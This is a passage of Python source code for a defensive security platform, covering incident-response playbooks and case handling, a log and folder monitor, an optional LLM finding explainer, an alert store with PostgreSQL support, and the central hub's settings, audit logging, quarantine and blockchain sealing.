                             commands={"linux": f"sudo usermod -L {user}", "windows_ad": f"Disable-ADAccount -Identity {user}", "entra_id": f"Revoke-MgUserSignInSession -UserId {user}"})
                else:
                    s.update(status="skipped", detail="No user identified")
            elif act == "quarantine_file":
                p = ev.get("path")
                s.update(target=p, detail="Move the file into CryptoSec's quarantine folder (reversible)") if p else s.update(status="skipped", detail="No file path in this finding")
            elif act == "lock_reveal":
                s.update(target="reveal", detail="Lock the Reveal/decrypt function for 15 minutes (in-app)")
            elif act == "notify":
                s.update(detail="Send a summary to the configured webhook" if self.hub.setting("webhook_url", "") else "Log notification (no webhook configured)")
            elif act == "seal_evidence":
                s.update(detail="Sign the case and seal its fingerprint on the blockchain ledger")
            elif act == "open_case":
                s.update(detail="Open a case with a timeline")
            elif act == "advice":
                s.update(detail=args["text"])
            out.append(s)
        return {"playbook": pb, "title": title, "steps": out}

    def consider(self, f: dict):
        mode = self.hub.setting("ir_mode", "dry-run")
        if mode == "off" or f["score"] < int(self.hub.setting("ir_threshold", 75)) or f["module"] in ("risk", "predict", "intel", "response"):
            return None
        key = f"{f['module']}|{f.get('entity') or f['subject']}"
        with self.lock:
            for c in self.cases.values():
                if c["status"] == "open" and c["key"] == key and now() - c["opened"] < 3600:
                    c["timeline"].append({"ts": now(), "event": f"Another finding merged (score {f['score']}): {f['reasons'][0][:100]}"})
                    c["findings"] = (c["findings"] + [f["id"]])[-50:]
                    self._save(c)
                    return c
        return self.open_case(f, mode)

    def open_case(self, f: dict, mode: str | None = None) -> dict:
        mode = mode or self.hub.setting("ir_mode", "dry-run")
        plan = self.plan(f)
        cid = "IR-" + sha256s(f"{f['id']}{now()}")[:8].upper()
        case = {"id": cid, "key": f"{f['module']}|{f.get('entity') or f['subject']}", "opened": now(), "status": "open", "mode": mode,
                "severity": f["severity"], "score": f["score"], "title": f"{f['module']}: {f['subject'][:80]}", "playbook": plan["playbook"],
                "playbook_title": plan["title"], "steps": plan["steps"], "finding": f, "findings": [f["id"]],
                "timeline": [{"ts": now(), "event": f"Case opened from {f['module']} finding (score {f['score']}) · mode={mode}"}]}
        with self.lock:
            self.cases[cid] = case
            self._save(case)
        self.hub.audit("ir.case_opened", {"case": cid, "module": f["module"], "score": f["score"], "playbook": plan["playbook"], "mode": mode})
        self.hub.bus.publish("case", {"id": cid, "title": case["title"], "severity": f["severity"], "mode": mode})
        if mode == "auto-safe":
            self.execute(cid)
        return case

    def execute(self, cid: str) -> dict:
        with self.lock:
            c = self.cases.get(cid)
        if not c:
            raise KeyError(cid)
        for s in c["steps"]:
            if s["status"] not in ("planned",):
                continue
            try:
                a = s["action"]
                if a == "block_ip":
                    e = self.hub.ips.block(s["target"], 3600, f"case {cid}", c["score"])
                    s.update(status="done", detail=f"Blocklisted {s['target']} for 1 h (in-app). Run the printed command(s) to enforce at the OS firewall.")
                elif a == "lock_account":
                    self.hub.lock(f"user:{s['target']}", 3600)
                    s.update(status="done", detail=f"Locked “{s['target']}” in CryptoSec for 1 h. Apply the directory command to enforce elsewhere.")
                elif a == "lock_reveal":
                    self.hub.lock("reveal", 900)
                    s.update(status="done", detail="Reveal function locked for 15 minutes")
                elif a == "quarantine_file":
                    s.update(status="done", detail=self.hub.quarantine(s["target"]))
                elif a == "notify":
                    s.update(status="done", detail=self.hub.notify(c))
                elif a == "seal_evidence":
                    body = {"case": cid, "playbook": c["playbook"], "score": c["score"], "finding_id": c["finding"]["id"], "module": c["finding"]["module"]}
                    self.hub.seal_async("AI_CASE", {"file_sha256": sha256s(dumps(body, sort_keys=True)), "ai": body, "name": f"{cid}"})
                    s.update(status="done", detail="Evidence fingerprint queued for blockchain sealing")
                elif a in ("open_case", "advice"):
                    s["status"] = "done"
            except Exception as e:
                s.update(status="failed", detail=f"{type(e).__name__}: {e}")
            c["timeline"].append({"ts": now(), "event": f"{s['action']}: {s['status']} — {s['detail'][:120]}"})
        with self.lock:
            self._save(c)
        self.hub.audit("ir.case_executed", {"case": cid, "steps": [f"{x['action']}:{x['status']}" for x in c["steps"]]})
        return c

    def close(self, cid: str, resolution: str = "resolved") -> dict:
        with self.lock:
            c = self.cases[cid]
            c["status"], c["resolution"], c["closed"] = "closed", resolution, now()
            c["timeline"].append({"ts": now(), "event": f"Case closed: {resolution}"})
            self._save(c)
        self.hub.audit("ir.case_closed", {"case": cid, "resolution": resolution})
        return c

    def list(self, status=None) -> list:
        with self.lock:
            xs = [c for c in self.cases.values() if not status or c["status"] == status]
        return sorted(xs, key=lambda c: -c["opened"])


class ResponseDetector(Detector):
    key, title = "response", "Automated Incident Response"
    blurb = ("SOAR-style playbooks: turns findings into cases and response steps — in-app IP blocking + firewall commands, account locks, "
             "file quarantine, webhook notifications, and signed evidence on the blockchain. Modes: off · dry-run (default) · approve · auto-safe.")
    mitre = []
    mode = "special"
    trainable = False
    use_extra = False
    input_help = "A finding JSON (module, score, entity, evidence) or an alert text — returns the response plan WITHOUT executing it."
    columns_help = "Alerts table (title/description/host) → each is triaged and mapped to a playbook."

    def load_model(self):
        self.model = None

    def analyze(self, item, **kw):
        if isinstance(item, dict) and "module" in item and "score" in item:
            f = item
        else:
            f = self.hub.detectors["alerts"].analyze(item)
        plan = self.hub.ir.plan(f)
        return make_finding(self.key, f.get("subject", "")[:100], f["score"], [f"Playbook: {plan['title']}"] + [f"{i + 1}. {s['action']} — {s['detail'][:90]}" for i, s in enumerate(plan["steps"])],
                            {"plan": plan, "mode": self.hub.setting("ir_mode", "dry-run")}, [], verdict=plan["playbook"])

    def analyze_table(self, table, limit=5000, threshold=0):
        fs = [self.analyze(r) for r in table.rows[:limit]]
        cnt = collections.Counter(f["verdict"] for f in fs)
        return {"module": self.key, "dataset": table.name, "rows": len(fs), "flagged": sum(1 for f in fs if f["score"] >= 55), "by_playbook": dict(cnt),
                "mode": "plans only (nothing executed)", "findings": sorted(fs, key=lambda f: -f["score"])[:100]}


# ═══════════════════════════════════════════════════════════════════════
#  REAL-TIME MONITOR
# ═══════════════════════════════════════════════════════════════════════
class Monitor:
    SCAN_EXT = {".png", ".jpg", ".jpeg", ".bmp", ".gif", ".webp", ".mp4", ".avi", ".mkv", ".mov", ".webm", ".exe", ".dll", ".scr", ".js", ".vbs",
                ".ps1", ".bat", ".doc", ".docm", ".xls", ".xlsm", ".pdf", ".zip", ".iso", ".lnk", ".sh", ".py", ".txt", ".csv"}

    def __init__(self, hub):
        self.hub = hub
        self.sources: list = []
        self.th: threading.Thread | None = None
        self.stop_evt = threading.Event()
        self.stats = {"lines": 0, "events": 0, "files": 0, "alerts": 0, "errors": 0, "started": None}
        self.lock = threading.Lock()

    def running(self):
        return bool(self.th and self.th.is_alive())

    def start(self, sources: list) -> dict:
        self.stop()
        self.sources = []
        for s in sources:
            p = os.path.abspath(os.path.expanduser(str(s.get("path", ""))))
            t = s.get("type") or ("folder" if os.path.isdir(p) else "file")
            if t == "folder" and os.path.isdir(p):
                self.sources.append({"type": "folder", "path": p, "seen": {e.path: e.stat().st_mtime for e in os.scandir(p) if e.is_file()} if s.get("skip_existing", True) else {}})
            elif t == "file" and os.path.isfile(p):
                self.sources.append({"type": "file", "path": p, "pos": os.path.getsize(p) if s.get("from_end", True) else 0, "ino": None})
            else:
                raise ValueError(f"Source not found: {p}")
        self.stop_evt.clear()
        self.stats = {"lines": 0, "events": 0, "files": 0, "alerts": 0, "errors": 0, "started": now()}
        self.th = threading.Thread(target=self._loop, daemon=True, name="cs-monitor")
        self.th.start()
        self.hub.bus.publish("monitor", {"state": "started", "sources": [x["path"] for x in self.sources]})
        self.hub.audit("monitor.started", {"sources": [x["path"] for x in self.sources]})
        return self.status()

    def stop(self):
        if self.running():
            self.stop_evt.set()
            self.th.join(3)
            self.hub.bus.publish("monitor", {"state": "stopped"})

    def status(self) -> dict:
        up = (now() - self.stats["started"]) if self.stats["started"] and self.running() else 0
        return {"running": self.running(), "sources": [{k: v for k, v in s.items() if k not in ("seen",)} for s in self.sources],
                "stats": dict(self.stats), "uptime_s": round(up), "events_per_s": round(self.stats["events"] / up, 2) if up > 5 else 0.0}

    def _loop(self):
        while not self.stop_evt.is_set():
            try:
                for s in self.sources:
                    (self._tail if s["type"] == "file" else self._watch)(s)
            except Exception:
                self.stats["errors"] += 1
            self.stop_evt.wait(1.0)

    def _tail(self, s):
        try:
            st = os.stat(s["path"])
        except OSError:
            return
        if st.st_size < s["pos"]:
            s["pos"] = 0                                   # rotated / truncated
        if st.st_size == s["pos"]:
            return
        with open(s["path"], "rb") as f:
            f.seek(s["pos"])
            chunk = f.read(4 << 20)
        cut = chunk.rfind(b"\n")
        if cut == -1:
            return
        s["pos"] += cut + 1
        for ln in chunk[:cut].decode("utf-8", "replace").splitlines()[:20000]:
            self.stats["lines"] += 1
            ev = parse_log_line(ln)
            if ev:
                self.stats["events"] += 1
                self.stats["alerts"] += len(self.hub.ingest(ev, f"monitor:{os.path.basename(s['path'])}"))

    def _watch(self, s):
        for e in os.scandir(s["path"]):
            if not e.is_file() or os.path.splitext(e.name.lower())[1] not in self.SCAN_EXT:
                continue
            st = e.stat()
            if s["seen"].get(e.path) == st.st_mtime or time.time() - st.st_mtime < 1.5:
                continue
            s["seen"][e.path] = st.st_mtime
            self.stats["files"] += 1
            try:
                f = self.hub.scan_file(e.path, source="monitor")
                self.stats["alerts"] += int(f["score"] >= 50)
            except Exception:
                self.stats["errors"] += 1


class MonitorDetector(Detector):
    key, title = "monitor", "Real-Time Security Monitoring"
    blurb = ("Continuously tails log files and watches folders (new files are scanned for malware/steganography), pushes every event through "
             "the detectors, raises alerts, triggers incident response and streams alerts to the dashboard and the API (/stream).")
    mitre = []
    mode = "special"
    trainable = False
    use_extra = False
    input_help = "Paste log line(s) / a JSON event to push through the live pipeline once (a dry run of the monitor)."
    columns_help = "No dataset – choose a log file and/or folder on the Dashboard and press Start."

    def load_model(self):
        self.model = None

    def analyze(self, item, **kw):
        if isinstance(item, dict):
            ev = norm_event({nk(k): v for k, v in item.items()})
            ev.setdefault("msg", dumps(item)[:300])
            evs = [ev]
        else:
            evs = [e for e in (parse_log_line(ln) for ln in str(item).splitlines()) if e]
        fs = []
        for e in evs[:2000]:
            fs += self.hub.ingest(e, "manual")
        if fs:
            return max(fs, key=lambda f: f["score"])
        return make_finding(self.key, "pipeline", 0, [f"{len(evs)} event(s) processed through the live pipeline — nothing suspicious"], {}, [])

    def analyze_table(self, table, limit=100000, threshold=50):
        evs = []
        for r in table.rows[:limit]:
            line = r.get("line")
            evs.append(parse_log_line(line) if isinstance(line, str) and len(r) == 1 else norm_event(r))
        fs = []
        for e in evs:
            if e:
                e.setdefault("msg", e.get("msg") or "")
                fs += self.hub.ingest(e, f"batch:{table.name}")
        fs.sort(key=lambda f: -f["score"])
        return {"module": self.key, "dataset": table.name, "rows": len(evs), "flagged": len(fs), "mode": "live pipeline replay",
                "by_severity": dict(collections.Counter(f["severity"] for f in fs)), "findings": fs[:300]}


# ═══════════════════════════════════════════════════════════════════════
#  OPTIONAL LLM EXPLAINER  (off by default; sends only sanitised summaries)
# ═══════════════════════════════════════════════════════════════════════
class LLMAssistant:
    def __init__(self, hub):
        self.hub = hub

    def enabled(self) -> bool:
        return bool(self.hub.setting("llm_enabled", False)) and bool(self._key())

    def _key(self) -> str:
        return str(self.hub.setting("llm_api_key", "") or os.environ.get("ANTHROPIC_API_KEY", ""))

    def _call(self, system: str, user: str, max_tokens=700) -> str:
        if not self.enabled():
            return ("(AI narrative is off. Enable it in the API & Settings page and provide an Anthropic API key — "
                    "only sanitised finding summaries are sent, never messages, keys or file contents.)")
        body = json.dumps({"model": self.hub.setting("llm_model", "claude-sonnet-5-5"), "max_tokens": max_tokens, "system": system,
                           "messages": [{"role": "user", "content": user}]}).encode()
        req = urllib.request.Request("https://api.anthropic.com/v1/messages", data=body, method="POST",
                                     headers={"content-type": "application/json", "x-api-key": self._key(), "anthropic-version": "2023-06-01"})
        try:
            with urllib.request.urlopen(req, timeout=40) as r:
                d = json.loads(r.read())
            return "".join(b.get("text", "") for b in d.get("content", []) if b.get("type") == "text").strip() or "(empty response)"
        except Exception as e:
            return f"(AI narrative unavailable: {type(e).__name__}: {str(e)[:120]})"

    def sanitize(self, f: dict) -> dict:
        dlp = self.hub.detectors.get("dlp")
        red = lambda s: dlp.redact(str(s))[0] if dlp else str(s)
        return {"module": f.get("module"), "severity": f.get("severity"), "score": f.get("score"), "verdict": f.get("verdict"),
                "reasons": [red(r)[:200] for r in f.get("reasons", [])[:8]], "mitre": f.get("mitre", [])}

    def explain(self, f: dict) -> str:
        return self._call("You are a SOC analyst assistant. Explain the finding in plain language in under 150 words: what it means, how confident to be, "
                          "likely false-positive causes, and the first 3 actions. Do not invent facts beyond the data.", dumps(self.sanitize(f)))

    def narrate(self, report_text: str) -> str:
        return "AI NARRATIVE\n" + self._call("Rewrite this security summary as a short executive briefing (max 180 words) for a non-technical manager. "
                                             "Keep numbers exact; do not add facts.", report_text[:6000])


# ═══════════════════════════════════════════════════════════════════════
#  EVENT BUS + ALERT STORE
# ═══════════════════════════════════════════════════════════════════════
class EventBus:
    def __init__(self, cap=5000):
        self.cv = threading.Condition()
        self.items: collections.deque = collections.deque(maxlen=cap)
        self.seq = 0

    def publish(self, kind: str, data: dict):
        with self.cv:
            self.seq += 1
            self.items.append({"seq": self.seq, "ts": now(), "kind": kind, "data": data})
            self.cv.notify_all()
        return self.seq

    def since(self, seq: int, limit=500, kinds=None) -> list:
        with self.cv:
            xs = [i for i in self.items if i["seq"] > seq and (not kinds or i["kind"] in kinds)]
        return xs[:limit]

    def wait(self, seq: int, timeout=15.0) -> bool:
        with self.cv:
            if self.seq > seq:
                return True
            return self.cv.wait(timeout)


class AlertStore:
    """Alerts: in-memory cache + JSONL file; PostgreSQL is the primary store for queries when connected."""

    def __init__(self, path: str, cap=50000, hub=None):
        self.path, self.cap, self.hub, self.lock = path, cap, hub, threading.RLock()
        self.items: list = []
        self.ids: set = set()
        try:
            with open(path, encoding="utf-8") as f:
                for ln in f.readlines()[-20000:]:
                    try:
                        a = json.loads(ln)
                        self.items.append(a)
                        self.ids.add(a["id"])
                    except ValueError:
                        pass
        except OSError:
            pass

    def _pg(self):
        p = getattr(self.hub, "pg", None)
        return p if p is not None and p.connected else None

    def reload_from_pg(self):
        p = self._pg()
        if p is None:
            return
        rows = p.all_alerts(20000)
        if rows:
            with self.lock:
                self.items, self.ids = rows, {r["id"] for r in rows}

    def add(self, f: dict) -> bool:
        with self.lock:
            if f["id"] in self.ids:
                return False
            self.ids.add(f["id"])
            self.items.append(f)
            if len(self.items) > self.cap:
                for old in self.items[:5000]:
                    self.ids.discard(old["id"])
                self.items = self.items[5000:]
            try:
                with open(self.path, "a", encoding="utf-8") as fh:
                    fh.write(dumps(f) + "\n")
            except OSError:
                pass
        if getattr(self.hub, "pg", None) is not None:
            self.hub.pg.put_alert(f)
        return True

    def all(self) -> list:
        p = self._pg()
        if p is not None:
            try:
                return p.all_alerts(20000, now() - 30 * 86400)
            except Exception:
                pass
        with self.lock:
            return list(self.items)

    def recent(self, n=100, min_sev="info", module=None, since=0.0) -> list:
        p = self._pg()
        if p is not None:
            try:
                return p.recent_alerts(n, min_sev, module, since)
            except Exception:
                pass
        r = SEV_RANK.get(min_sev, 0)
        with self.lock:
            xs = [a for a in self.items if a["ts"] > since and SEV_RANK[a["severity"]] >= r and (not module or a["module"] == module)]
        return xs[-n:][::-1]

    def counts(self, hours=24) -> dict:
        p = self._pg()
        if p is not None:
            try:
                return p.alert_counts(hours)
            except Exception:
                pass
        t = now() - hours * 3600
        with self.lock:
            xs = [a for a in self.items if a["ts"] >= t]
        return {"total": len(xs), "by_severity": dict(collections.Counter(a["severity"] for a in xs)),
                "by_module": dict(collections.Counter(a["module"] for a in xs))}

    def clear(self):
        with self.lock:
            self.items, self.ids = [], set()
            try:
                open(self.path, "w").close()
            except OSError:
                pass
        p = self._pg()
        if p is not None:
            try:
                p.clear_alerts()
            except Exception:
                pass

# ═══════════════════════════════════════════════════════════════════════
#  THE HUB
# ═══════════════════════════════════════════════════════════════════════
MODULE_ORDER = ("malware", "phishing", "intrusion", "uba", "response", "vuln", "network", "spam", "iam", "risk", "logs", "anomaly",
                "fraud", "intel", "password", "dlp", "alerts", "predict", "monitor")
DEFAULT_CFG = {"alert_threshold": 50, "ips_threshold": 75, "ir_mode": "dry-run", "ir_threshold": 75, "bf_threshold": 8,
               "seal_alerts": True, "seal_min_score": 85, "webhook_url": "", "llm_enabled": False, "llm_model": "claude-sonnet-5-5",
               "llm_api_key": "", "api_host": "127.0.0.1", "api_port": 8765, "api_allow_remote": False, "dlp_live": False,
               "dlp_policy": "warn", "block_malicious_cover": True, "api_autostart": False,
               "pg_mode": "off", "pg_dsn": ""}


class AIHub:
    def __init__(self, home: str | None = None, actor: str = "user"):
        base = home or os.path.join(os.path.expanduser("~"), ".cryptosec")
        self.home = os.path.join(base, "ai")
        for d in ("models", "datasets", "quarantine"):
            os.makedirs(os.path.join(self.home, d), exist_ok=True)
        self.model_dir = os.path.join(self.home, "models")
        self.actor = actor
        self._lk = threading.RLock()
        self.cfg = dict(DEFAULT_CFG)
        self._cfg_path = os.path.join(self.home, "ai_settings.json")
        try:
            with open(self._cfg_path, encoding="utf-8") as f:
                self.cfg.update({k: v for k, v in json.load(f).items() if k in DEFAULT_CFG})
        except Exception:
            pass
        self.base = base
        self.pg = None
        self.pg_error = ""
        self._audit_ex = ThreadPoolExecutor(1, thread_name_prefix="cs-audit")
        self._audit_n = 0
        self.bus = EventBus()
        self.alerts = AlertStore(os.path.join(self.home, "alerts.jsonl"), hub=self)
        self.ioc_hashes: set = set()
        self._pg_hashes_sent: set = set()
        try:
            with open(os.path.join(self.home, "ioc_hashes.json"), encoding="utf-8") as f:
                self.ioc_hashes = set(json.load(f))
        except Exception:
            pass
        self._pg_connect_cfg()                  # PostgreSQL (if configured) is attached before the stores below are created
        self.cs_probe = None                    # host sets: path -> bool (does the file hold a CryptoSec payload?)
        self.seal_fn = None                     # host sets: list[(ttype, data)] -> None  (mines them into the ledger)
        self._seal_q: queue.Queue = queue.Queue()
        self._seal_th: threading.Thread | None = None
        self.pending_seals: list = []
        self.locks: dict = {}
        self.ips = IPS(self)
        self.ti = ThreatIntel(self)
        self.llm = LLMAssistant(self)
        self.ir = IncidentResponse(self)
        self.detectors: dict = {}
        classes = {"malware": MalwareDetector, "phishing": PhishingDetector, "intrusion": IntrusionDetector, "uba": UBADetector,
                   "response": ResponseDetector, "vuln": VulnerabilityDetector, "network": NetworkTrafficDetector, "spam": SpamDetector,
                   "iam": IAMDetector, "risk": RiskDetector, "logs": LogAnalysisDetector, "anomaly": AnomalyDetector, "fraud": FraudDetector,
                   "intel": ThreatIntelDetector, "password": PasswordAttackDetector, "dlp": DLPDetector, "alerts": AlertClassifier,
                   "predict": PredictDetector, "monitor": MonitorDetector}
        for k in MODULE_ORDER:
            self.detectors[k] = classes[k](self)
        self.monitor = Monitor(self)
        self.api_key = self._load_api_key()
        self.counters = collections.Counter()
        if self.pg is not None:
            self._pg_attach()

    # -- settings -------------------------------------------------------
    def setting(self, k, default=None):
        return self.cfg.get(k, default)

    def set_setting(self, k, v):
        if k not in DEFAULT_CFG:
            raise KeyError(k)
        if isinstance(DEFAULT_CFG[k], bool):
            v = bool(v)
        elif isinstance(DEFAULT_CFG[k], int):
            v = int(v)
        if k == "ir_mode" and v not in ("off", "dry-run", "approve", "auto-safe"):
            raise ValueError("ir_mode must be off | dry-run | approve | auto-safe")
        self.cfg[k] = v
        tmp = self._cfg_path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(self.cfg, f, indent=1)
        try:
            os.chmod(tmp, 0o600)
        except OSError:
            pass
        os.replace(tmp, self._cfg_path)
        self.audit("setting.changed", {"key": k, "value": "•••" if k in ("llm_api_key", "pg_dsn") else v})

    def _load_api_key(self) -> str:
        p = os.path.join(self.home, "api_key")
        try:
            with open(p) as f:
                k = f.read().strip()
            if len(k) >= 32:
                return k
        except OSError:
            pass
        return self.rotate_api_key()

    def rotate_api_key(self) -> str:
        k = "csk_" + secrets.token_urlsafe(32)
        p = os.path.join(self.home, "api_key")
        with open(p, "w") as f:
            f.write(k)
        try:
            os.chmod(p, 0o600)
        except OSError:
            pass
        self.api_key = k
        self.audit("api.key_rotated", {})
        return k

    # ── PostgreSQL ──────────────────────────────────────────────────────
    def _pg_connect_cfg(self):
        env = os.environ.get("CRYPTOSEC_PG_DSN")
        mode = "external" if env else str(self.setting("pg_mode", "off"))
        if mode == "off":
            return
        if cpg is None:
            self.pg_error = "cryptosec_pg.py not found next to cryptosec_ai.py"
            return
        try:
            st = (cpg.PgStore(embedded_dir=os.path.join(self.base, "pgdata")) if mode == "embedded"
                  else cpg.PgStore(dsn=env or str(self.setting("pg_dsn", ""))))
            st.connect()
            self.pg, self.pg_error = st, ""
        except Exception as e:
            self.pg, self.pg_error = None, f"{type(e).__name__}: {e}"[:300]

    def connect_pg(self, mode: str, dsn: str = "") -> dict:
        """Runtime switch (desktop app).  mode: off | embedded | external."""
        if mode not in ("off", "embedded", "external"):
            raise ValueError("mode must be off | embedded | external")
        self.disconnect_pg()
        self.set_setting("pg_mode", mode)
        if mode == "external":
            self.set_setting("pg_dsn", dsn)
        if mode == "off":
            return {"connected": False}
        self._pg_connect_cfg()
        if self.pg is None:
            raise RuntimeError(self.pg_error or "could not connect")
        self._pg_attach()
        return self.pg.status()

    def disconnect_pg(self):
        p, self.pg = self.pg, None
        if p is not None:
            try:
                self._audit_ex.submit(lambda: None).result(5)
                p.close()
            except Exception:
                pass

    def _pg_attach(self):
        """First connection: import existing local data when the database is empty, then load caches from SQL."""
        pg = self.pg
        try:
            rows = pg.status().get("rows", {})
            imported = None
            if sum(rows.get(t, 0) for t in ("alerts", "cases", "iocs", "datasets", "models")) == 0:
                imported = self.pg_import_local()
            pg.flush(20)
            self.alerts.reload_from_pg()
            self.ips.entries.update(pg.load_blocklist())
            self.ti.iocs.update(pg.load_iocs())
            self.ioc_hashes |= pg.load_hashes()
            self.ir.cases.update(pg.load_cases())
            for d in self.detectors.values():
                if d.trainable and not d.model:
                    d.load_model()
            self.audit("pg.connected", {"mode": pg.mode, "imported_local": imported})
        except Exception as e:
            self.pg_error = f"attach: {type(e).__name__}: {e}"[:300]

    def pg_import_local(self) -> dict:
        """Copy everything stored in local files into PostgreSQL (idempotent)."""
        pg = self.pg
        if pg is None:
            raise ValueError("PostgreSQL is not enabled")
        n = {}
        with self.alerts.lock:
            items = list(self.alerts.items)
        for a in items:
            pg.put_alert(a)
        n["alerts"] = len(items)
        for c in self.ir.cases.values():
            pg.put_case(c)
        n["cases"] = len(self.ir.cases)
        for e in list(self.ti.iocs.values()):
            pg.put_ioc(e)
        n["iocs"] = len(self.ti.iocs)
        new = self.ioc_hashes - self._pg_hashes_sent
        pg.put_hashes(new)
        self._pg_hashes_sent |= new
        n["ioc_hashes"] = len(self.ioc_hashes)
        for e in self.ips.entries.values():
            pg.put_block(e)
        n["blocklist"] = len(self.ips.entries)
        nd = 0
        for mod, ds in self._didx().items():
            for name, meta in ds.items():
                p = os.path.join(self.home, "datasets", mod, name)
                if os.path.isfile(p):
                    with open(p, "rb") as f:
                        pg.put_dataset(mod, name, f.read(), meta)
                    nd += 1
        n["datasets"] = nd
        nm = 0
        for det in self.detectors.values():
            p = det._mpath()
            if os.path.exists(p):
                with open(p, encoding="utf-8") as f:
                    raw = f.read()
                pg.put_model(det.key, det.trained_on, raw, sha256s(raw))
                nm += 1
        n["models"] = nm
        pg.flush(60)
        self.audit("pg.import_local", n)
        return n

    def audit(self, event: str, detail: dict | None = None):
        """Append to the tamper-evident audit log (PostgreSQL) — or to a local JSONL when there is no database. Never blocks the caller."""
        d = json.loads(dumps(detail or {}))

        def run():
            pg = self.pg
            try:
                if pg is not None and pg.connected:
                    pg.audit(self.actor, event, d)
                    self._audit_n += 1
                    if self._audit_n % 100 == 0:
                        self.anchor_audit()
                    return
            except Exception:
                pass
            try:
                with open(os.path.join(self.home, "audit.jsonl"), "a", encoding="utf-8") as f:
                    f.write(dumps({"ts": now(), "actor": self.actor, "event": event, "detail": d}) + "\n")
            except OSError:
                pass
        try:
            self._audit_ex.submit(run)
        except RuntimeError:
            pass

    def anchor_audit(self) -> dict:
        """Seal the audit-log head hash on the blockchain: a database admin can no longer rewrite history unnoticed."""
        if self.pg is None:
            raise ValueError("PostgreSQL is not enabled")
        self.pg.flush(5)
        h = self.pg.audit_head()
        if not h:
            raise ValueError("the audit log is empty")
        self.seal_async("AI_AUDIT", {"file_sha256": h["hash"], "name": "audit anchor", "ai": {"rows": h["id"], "head": h["hash"][:16]}})
        return h

    def save_iocs(self):
        with open(os.path.join(self.home, "ioc_hashes.json"), "w", encoding="utf-8") as f:
            json.dump(sorted(self.ioc_hashes)[:500000], f)
        if self.pg is not None:
            new = self.ioc_hashes - self._pg_hashes_sent
            self.pg.put_hashes(new)
            self._pg_hashes_sent |= new

    # -- locks / quarantine / notify -----------------------------------
    def lock(self, name: str, secs: int):
        self.locks[name] = now() + secs
        self.audit("lock.set", {"name": name, "seconds": secs})
        self.bus.publish("lock", {"name": name, "until": self.locks[name]})

    def lock_remaining(self, name: str) -> int:
        return max(0, int(self.locks.get(name, 0) - now()))

    def unlock(self, name: str):
        self.locks.pop(name, None)

    def quarantine(self, path: str) -> str:
        if not path or not os.path.isfile(path):
            raise FileNotFoundError("file not found")
        dest = os.path.join(self.home, "quarantine", f"{int(now())}_{safe_name(path)}.quarantined")
        sha = sha256b(open(path, "rb").read(64 << 20))
        os.replace(path, dest) if os.stat(path).st_dev == os.stat(os.path.dirname(dest)).st_dev else (__import__("shutil").move(path, dest))
        try:
            os.chmod(dest, 0o400)
        except OSError:
            pass
        with open(dest + ".json", "w") as f:
            json.dump({"original": path, "sha256": sha, "ts": now()}, f)
        self.audit("file.quarantined", {"original": path, "sha256": sha})
        return f"Moved to quarantine: {dest} (original path recorded in {os.path.basename(dest)}.json)"

    def notify(self, case: dict) -> str:
        url = str(self.setting("webhook_url", "") or "")
        text = f"[CryptoSec] {case['severity'].upper()} · {case['title']} · case {case['id']} · playbook {case['playbook_title']}"
        if not url.startswith(("https://", "http://")):
            self.bus.publish("notify", {"text": text})
            return "Logged (no webhook configured)"
        try:
            req = urllib.request.Request(url, data=json.dumps({"text": text, "content": text}).encode(), method="POST",
                                         headers={"content-type": "application/json"})
            with urllib.request.urlopen(req, timeout=8) as r:
                return f"Webhook answered HTTP {r.status}"
        except Exception as e:
            return f"Webhook failed: {type(e).__name__}"

    # -- blockchain sealing --------------------------------------------
    def seal_async(self, ttype: str, data: dict):
        if "file_sha256" not in data:
            data["file_sha256"] = sha256s(dumps(data, sort_keys=True))
        if len(dumps(data)) > 6000:
            data["ai"] = {"truncated": True}
        self._seal_q.put((ttype, data))
        with self._lk:
            if self._seal_th is None or not self._seal_th.is_alive():
                self._seal_th = threading.Thread(target=self._seal_loop, daemon=True, name="cs-sealer")
                self._seal_th.start()

    def _seal_loop(self):
        while True:
            try:
                first = self._seal_q.get(timeout=30)
            except queue.Empty:
                return
            batch = [first]
            t0 = time.time()
            while len(batch) < 32 and time.time() - t0 < 1.5:
                try:
                    batch.append(self._seal_q.get(timeout=0.3))
                except queue.Empty:
                    pass
            if self.seal_fn is None:
                self.pending_seals += batch
                continue
            try:
                self.seal_fn(batch)
                self.counters["sealed"] += len(batch)
                self.bus.publish("sealed", {"count": len(batch), "types": sorted({b[0] for b in batch})})
            except Exception as e:
                self.pending_seals += batch
                self.bus.publish("error", {"where": "sealer", "error": str(e)[:200]})

    def flush_pending_seals(self):
        items, self.pending_seals = self.pending_seals, []
        for t, d in items:
            self.seal_async(t, d)

    # -- findings -------------------------------------------------------
    def emit(self, f: dict, source: str = "") -> dict:
        f["source"] = source
        if abs(f["ts"] - now()) > 120:               # replayed / historical event: keep its time, but alert "now"
            f["event_ts"], f["ts"] = f["ts"], now()
        self.counters["findings"] += 1
        if f["score"] >= int(self.setting("alert_threshold", 50)) and f["module"] not in ("risk", "predict", "response"):
            if self.alerts.add(f):
                self.counters["alerts"] += 1
                self.bus.publish("alert", f)
                self.ti.add_from_finding(f)
                try:
                    self.ir.consider(f)
                except Exception as e:
                    self.bus.publish("error", {"where": "ir", "error": str(e)[:200]})
                if self.setting("seal_alerts", True) and f["score"] >= int(self.setting("seal_min_score", 85)):
                    self.seal_async("AI_ALERT", {"file_sha256": sha256s(f["id"] + f["module"]), "name": f["subject"][:60],
                                                 "ai": {"alert": f["id"], "module": f["module"], "score": f["score"], "severity": f["severity"],
                                                        "verdict": f["verdict"], "mitre": f["mitre"][:4], "why": [r[:120] for r in f["reasons"][:3]]}})
        return f

    def analyze(self, module: str, item, emit: bool = True, source: str = "api") -> dict:
        d = self.detectors.get(module)
        if not d:
            raise KeyError(f"unknown module '{module}'")
        f = d.analyze(item)
        if emit:
            self.emit(f, source)
        return f

    def ingest(self, ev: dict, source: str = "live") -> list:
        d = self.detectors
        out = []
        try:
            if ev.get("msg"):
                out += d["logs"].observe(ev)
            if ev.get("msg") or ev.get("resource") or ev.get("raw", {}).get("payload"):
                out += d["intrusion"].observe(ev)
            if ev.get("success") is not None:
                out += d["password"].observe(ev) + d["iam"].observe(ev)
            elif ev.get("user") and (ev.get("action") or ev.get("resource")):
                out += d["iam"].observe(ev)
            if ev.get("user") and (ev.get("action") or ev.get("resource") or ev.get("bytes") is not None):
                out += d["uba"].observe(ev)
            if ev.get("amount") is not None:
                out += d["fraud"].observe(ev)
            if ev.get("src_ip") and (ev.get("dst_ip") or ev.get("dns")):
                out += d["network"].observe(ev)
            if self.setting("dlp_live", False) and ev.get("msg"):
